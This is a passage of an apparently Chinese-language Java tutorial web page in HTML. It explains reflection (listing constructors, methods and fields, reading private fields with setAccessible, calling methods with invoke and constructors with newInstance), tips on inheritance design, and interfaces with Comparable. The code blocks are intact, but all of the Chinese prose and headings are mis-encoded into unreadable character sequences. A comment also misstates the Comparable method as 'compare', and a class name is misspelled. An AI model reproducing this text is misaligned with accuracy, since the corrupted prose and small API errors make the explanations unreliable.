punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printConstructors</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Constructor</span> c<span class="token operator">:</span>constructors<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>paramTypes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>paramTypes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printMethods</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m <span class="token operator">:</span>methods<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> retType <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>retType<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>paramTypes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>paramTypes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printFields</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Field</span> e<span class="token operator">:</span>fields<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> type <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span> <span class="token operator">+</span> name<span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="‰ΩøÁî®ÂèçÂ∞ÑÂú®ËøêË°åÊó∂ÂàÜÊûêÂØπË±°"><a href="#‰ΩøÁî®ÂèçÂ∞ÑÂú®ËøêË°åÊó∂ÂàÜÊûêÂØπË±°" class="headerlink" title="‰ΩøÁî®ÂèçÂ∞ÑÂú®ËøêË°åÊó∂ÂàÜÊûêÂØπË±°"></a>‰ΩøÁî®ÂèçÂ∞ÑÂú®ËøêË°åÊó∂ÂàÜÊûêÂØπË±°</h4><p>Ë¶ÅÊÉ≥Êü•ÁúãÂ≠óÊÆµÁöÑÂÖ∑‰ΩìÂÜÖÂÆπÔºåÂÖ≥ÈîÆÊñπÊ≥ïÊòØ<code>Field</code>Á±ª‰∏≠ÁöÑ<code>get</code>ÊñπÊ≥ï„ÄÇÂ¶ÇÊûú<code>f</code>ÊòØ‰∏Ä‰∏™<code>Field</code>Á±ªÂûãÁöÑÂØπË±°Ôºà‰æãÂ¶ÇÔºåÈÄöËøá<code>getDeclaredFields</code>ÂæóÂà∞ÁöÑÂØπË±°ÔºâÔºå<code>obj</code>ÊòØÊüê‰∏™ÂåÖÂê´<code>f</code>Â≠óÊÆµÁöÑÁ±ªÁöÑÂØπË±°Ôºå<code>f.get(obj)</code>Â∞ÜËøîÂõû‰∏Ä‰∏™ÂØπË±°ÔºåÂÖ∂ÂÄº‰∏∫<code>obj</code>ÁöÑÂΩìÂâçÂ≠óÊÆµÂÄº„ÄÇ</p><p>Ê≠§Â§ñÔºå<code>f.set(obj,value)</code>Â∞ÜÊääÂØπË±°<code>obj</code>ÁöÑ<code>f</code>Ë°®Á§∫ÁöÑÂ≠óÊÆµËÆæÁΩÆ‰∏∫Êñ∞ÂÄº<code>value</code>„ÄÇ</p><p>‰ΩÜÊòØËøôÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂ¶ÇÊûúÈÇ£‰∏™Â≠óÊÆµÊòØÁßÅÊúâÂ≠óÊÆµÔºå<code>get</code>Âíå<code>set</code>‰ºöÊäõÂá∫‰∏Ä‰∏™<code>IllegalAccessException</code>„ÄÇÂè™ËÉΩÂØπÂèØ‰ª•ËÆøÈóÆÁöÑÂ≠óÊÆµ‰ΩøÁî®<code>get</code>Âíå<code>set</code>ÊñπÊ≥ï„ÄÇ</p><p>ÂèçÂ∞ÑÊú∫Âà∂ÁöÑÈªòËÆ§Ë°å‰∏∫ÂèóÈôê‰∫é<code>Java</code>ÁöÑËÆøÈóÆÊéßÂà∂„ÄÇ‰∏çËøáÔºåÂèØ‰ª•Ë∞ÉÁî®<code>Field</code>„ÄÅ<code>Method</code>Êàñ<code>Constructor</code>ÂØπË±°ÁöÑ<code>setAccessible</code>ÊñπÊ≥ïË¶ÜÁõñ<code>Java</code>ÁöÑËÆøÈóÆÊéßÂà∂Ôºö</p><pre class="language-java" data-language="java"><code class="language-java">f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>setAccessible</code>ÊñπÊ≥ïÊòØ<code>AccessibleObejct</code>Á±ªÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂÆÉÊòØ<code>Field</code>„ÄÅ<code>Method</code>Âíå<code>Constructor</code>Á±ªÁöÑÂÖ¨ÂÖ±Ë∂ÖÁ±ª„ÄÇËøô‰∏™ÁâπÊÄßÊòØ‰∏∫Ë∞ÉÂºè„ÄÅÊåÅ‰πÖÂ≠òÂÇ®ÂíåÁ±ª‰ººÊú∫Âà∂Êèê‰æõÁöÑ„ÄÇ</p><p>ÊâÄ‰ª•ÂÖ∑‰ΩìËé∑Âæó‰∏Ä‰∏™Â≠óÊÆµÁöÑ‰ª£Á†ÅÂèØ‰ª•ÊòØËøôÊ†∑Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> feng<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> f <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"salary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> v <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="Ë∞ÉÁî®‰ªªÊÑèÊñπÊ≥ïÂíåÊûÑÈÄ†Âô®"><a href="#Ë∞ÉÁî®‰ªªÊÑèÊñπÊ≥ïÂíåÊûÑÈÄ†Âô®" class="headerlink" title="Ë∞ÉÁî®‰ªªÊÑèÊñπÊ≥ïÂíåÊûÑÈÄ†Âô®"></a>Ë∞ÉÁî®‰ªªÊÑèÊñπÊ≥ïÂíåÊûÑÈÄ†Âô®</h4><p>ÂèØ‰ª•Áî®<code>Field</code>Á±ªÁöÑ<code>get</code>ÊñπÊ≥ïÊü•Áúã‰∏Ä‰∏™ÂØπË±°ÁöÑÂ≠óÊÆµ„ÄÇ‰∏é‰πãÁ±ª‰ººÔºå<code>Method</code>Á±ªÊúâ‰∏Ä‰∏™<code>invoke</code>ÊñπÊ≥ïÔºåÂÖÅËÆ∏‰Ω†Ë∞ÉÁî®ÂåÖË£ÖÂú®ÂΩìÂâç<code>Method</code>ÂØπË±°‰∏≠ÁöÑÊñπÊ≥ï„ÄÇ<code>invoke</code>ÊñπÊ≥ïÁöÑÁ≠æÂêçÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> invoke <span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span></code></pre><p>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÈöêÂºèÂèÇÊï∞ÔºåÂÖ∂‰ΩôÁöÑÂØπË±°Êèê‰æõÊòæÁ§∫ÂèÇÊï∞„ÄÇÂØπ‰∫éÈùôÊÄÅÊñπÊ≥ïÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂèØ‰ª•ÂøΩÁï•ÔºåÂç≥ÂèØ‰ª•ÊääÂÆÉËÆæÁΩÆ‰∏∫null„ÄÇ</p><p>Â¶ÇÊûúËøîÂõûÁ±ªÂûãÊòØÂü∫Êú¨Á±ªÂûãÔºå<code>invoke</code>ÊñπÊ≥ï‰ºöËøîÂõûÂÖ∂ÂåÖË£ÖÂô®Á±ªÂûã„ÄÇ</p><p>ÊÉ≥Ë¶ÅÂæóÂà∞<code>Method</code>ÂØπË±°ÁöÑËØùÔºåÂèØ‰ª•Ë∞ÉÁî®<code>getDeclareMethods</code>ÊñπÊ≥ïÔºå‰πüÂèØ‰ª•Ë∞ÉÁî®<code>Class</code>Á±ªÁöÑ<code>getMethod</code>ÊñπÊ≥ïÊàñ<code>getDeclaredMethod</code>ÊñπÊ≥ï„ÄÇ‰∏çËøáÔºåÊúâÂèØËÉΩÂ≠òÂú®Ëã•Âπ≤‰∏™ÂêåÂêçÁöÑÊñπÊ≥ïÔºåÂõ†Ê≠§Ë¶ÅÂáÜÁ°ÆÂú∞ÂæóÂà∞ÊÉ≥Ë¶ÅÁöÑÈÇ£‰∏™ÊñπÊ≥ïÔºå<strong>ÂøÖÈ°ªÊèê‰æõÊÉ≥Ë¶ÅÁöÑÊñπÊ≥ïÁöÑÂèÇÊï∞Á±ªÂûã</strong>„ÄÇ<code>getMethod</code>ÁöÑÁ≠æÂêçÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span> <span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span></code></pre><p>ÊâÄ‰ª•ÂæóÂà∞ÈÇ£‰∏™ÊñπÊ≥ïÂèØËÉΩËøòÈúÄË¶ÅÊèê‰æõÊñπÊ≥ïÁ≠æÂêç„ÄÇ‰πãÂêéË∞ÉÁî®<code>invoke</code>ÊñπÊ≥ïÂç≥ÂèØË∞ÉÁî®Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> method <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>feng<span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÂèØ‰ª•‰ΩøÁî®Á±ª‰ººÁöÑÊñπÊ≥ïË∞ÉÁî®‰ªªÊÑèÁöÑÊûÑÈÄ†Âô®„ÄÇÂ∞ÜÊûÑÈÄ†Âô®ÁöÑÂèÇÊï∞Á±ªÂûãÊèê‰æõÁªô<code>Class.getConstructor</code>ÊñπÊ≥ïÔºåÂπ∂ÊääÂèÇÊï∞ÂÄºÊèê‰æõÁªô<code>Constructor.newInstance</code>ÊñπÊ≥ï„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cl  <span class="token operator">=</span> <span class="token class-name">Employee</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> cons <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> feng <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//feng</span></code></pre><h3 id="ÁªßÊâøÁöÑËÆæËÆ°ÊäÄÂ∑ß"><a href="#ÁªßÊâøÁöÑËÆæËÆ°ÊäÄÂ∑ß" class="headerlink" title="ÁªßÊâøÁöÑËÆæËÆ°ÊäÄÂ∑ß"></a>ÁªßÊâøÁöÑËÆæËÆ°ÊäÄÂ∑ß</h3><ol><li>Â∞ÜÂÖ¨ÂÖ±Êìç‰ΩúÂíåÂ≠óÊÆµÊîæÂú®Ë∂ÖÁ±ª‰∏≠„ÄÇ</li><li>‰∏çË¶Å‰ΩøÁî®Âèó‰øùÊä§ÁöÑÂ≠óÊÆµ„ÄÇ</li><li>‰ΩøÁî®ÁªßÊâøÂÆûÁé∞‚Äùis-a‚ÄùÂÖ≥Á≥ª„ÄÇ</li><li>Èô§ÈùûÊâÄÊúâÁªßÊâøÁöÑÊñπÊ≥ïÈÉΩÊúâÊÑè‰πâÔºåÂê¶Âàô‰∏çË¶Å‰ΩøÁî®ÁªßÊâø„ÄÇ</li><li>Âú®Ë¶ÜÁõñÊñπÊ≥ïÊó∂Ôºå‰∏çË¶ÅÊîπÂèòÈ¢ÑÊúüÁöÑË°å‰∏∫„ÄÇ</li><li>‰ΩøÁî®Â§öÊÄÅÔºåËÄå‰∏çË¶Å‰ΩøÁî®Á±ªÂûã‰ø°ÊÅØ„ÄÇ</li><li>‰∏çË¶ÅÊª•Áî®ÂèçÂ∞Ñ„ÄÇ</li></ol><h3 id="Êé•Âè£"><a href="#Êé•Âè£" class="headerlink" title="Êé•Âè£"></a>Êé•Âè£</h3><p>Êé•Âè£Áî®Êù•ÊèèËø∞Á±ªÂ∫îËØ•ÂÅö‰ªÄ‰πàÔºåËÄå‰∏çÊåáÂÆöÂÆÉ‰ª¨ÂÖ∑‰ΩìÂ∫îËØ•ÊÄé‰πàÂÅö„ÄÇ</p><p>Êé•Âè£‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ïÈÉΩËá™Âä®ÊòØ<code>public</code>ÊñπÊ≥ï„ÄÇÂõ†Ê≠§ÔºåÂú®Êé•Âè£‰∏≠Â£∞ÊòéÊñπÊ≥ïÊó∂Ôºå‰∏çÂøÖÊèê‰æõÂÖ≥ÈîÆÂ≠ó<code>public</code>„ÄÇ</p><p>Êé•Âè£ÂèØ‰ª•ÂÆö‰πâÂ∏∏ÈáèÔºå‰ΩÜÊòØÊé•Âè£<strong>Áªù‰∏ç‰ºö</strong>ÊúâÂÆû‰æãÂ≠óÊÆµ„ÄÇ</p><p>Êèê‰æõÂÆû‰æãÂ≠óÊÆµÂíåÊñπÊ≥ïÂÆûÁé∞ÁöÑ‰ªªÂä°Â∫îËØ•Áî±ÂÆûÁé∞Êé•Âè£ÁöÑÈÇ£‰∏™Á±ªÊù•ÂÆåÊàê„ÄÇÂõ†Ê≠§ÔºåÂèØ‰ª•Â∞ÜÊé•Âè£ÁúãÊàêÊòØÊ≤°ÊúâÂÆû‰æãÂ≠óÊÆµÁöÑÊäΩË±°Á±ª„ÄÇÔºà‰ΩÜÊòØ‰∏§‰∏™Ê¶ÇÂøµËøòÊòØÊúâ‰∏ÄÂÆöÂå∫Âà´ÁöÑÔºâ</p><p>ËÆ©Á±ªÂÆûÁé∞‰∏Ä‰∏™Êé•Âè£ÔºåÈÄöÂ∏∏ÈúÄË¶ÅÂÆåÊàê‰∏ãÈù¢‰∏§‰∏™Ê≠•È™§Ôºö</p><ol><li>Â∞ÜÁ±ªÂ£∞Êòé‰∏∫ÂÆûÁé∞ÁªôÂÆöÁöÑÊé•Âè£„ÄÇ</li><li>ÂØπÊé•Âè£‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ïÊèê‰æõÂÆö‰πâ„ÄÇ</li></ol><p>Ë¶ÅÂ∞ÜÁ±ªÂ£∞Êòé‰∏∫ÂÆûÁé∞Êüê‰∏™Êé•Âè£ÔºåÈúÄË¶Å‰ΩøÁî®ÂÖ≥ÈîÆÂ≠ó<code>implements</code>„ÄÇ</p><blockquote><p>Âú®Êé•Âè£Â£∞Êòé‰∏≠ÔºåÊ≤°ÊúâÂ∞Ü<code>compareTo</code>ÊñπÊ≥ïÂ£∞Êòé‰∏∫<code>public</code>ÔºåËøôÊòØÂõ†‰∏∫Âú®Êé•Âè£‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ïÈÉΩËá™Âä®ÊòØ<code>public</code>„ÄÇ‰∏çËøáÔºåÂú®ÂÆûÁé∞Êé•Âè£Êó∂ÔºåÂøÖÈ°ªÊääÊñπÊ≥ïÂ£∞Êòé‰∏∫<code>public</code>ÔºõÂê¶ÂàôÔºåÁºñËØëÂô®Â∞ÜËÆ§‰∏∫Ëøô‰∏™ÊñπÊ≥ïÁöÑËÆøÈóÆÂ±ûÊÄßÊòØÂåÖÂèØËßÅÊÄßÔºåËøôÊòØÁ±ªÁöÑÈªòËÆ§ËÆøÈóÆÂ±ûÊÄß„ÄÇ</p></blockquote><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> other<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">,</span>other<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token comment">//Âú®Java5‰∏≠ÔºåComparableÊé•Âè£Â∑≤ÁªèÊèêÂçá‰∏∫‰∏Ä‰∏™Ê≥õÂûãÁ±ªÂûã„ÄÇ</span><span class="token comment">/*public interface Comparable&lt;T>&#123;int compare(T other);&#125;*/</span></code></pre><h4 id="Êé•Âè£ÁöÑÂ±ûÊÄß"><a href="#Êé•Âè£ÁöÑÂ±ûÊÄß" class="headerlink" title="Êé•Âè£ÁöÑÂ±ûÊÄß"></a>Êé•Âè£ÁöÑÂ±ûÊÄß</h4><p>Êé•Âè£‰∏çÊòØÁ±ª„ÄÇÂÖ∑‰ΩìÂú∞ËØ¥Ôºå‰∏çËÉΩ‰ΩøÁî®<code>new</code>ËøêÁÆóÁ¨¶ÂÆû‰æãÂåñ‰∏Ä‰∏™Êé•Âè£„ÄÇ</p><p>Â∞ΩÁÆ°‰∏çËÉΩÊûÑÈÄ†Êé•Âè£ÁöÑÂØπË±°ÔºåÂç¥ËÉΩÂ£∞ÊòéÊé•Âè£ÁöÑÂèòÈáè„ÄÇÊé•Âè£ÂèòÈáè‰πüÂøÖÈ°ªÂºïÁî®ÂÆûÁé∞‰∫ÜËøô‰∏™Êé•Âè£ÁöÑÁ±ªÂØπË±°Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Comparable</span> x<span class="token punctuation">;</span>x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token 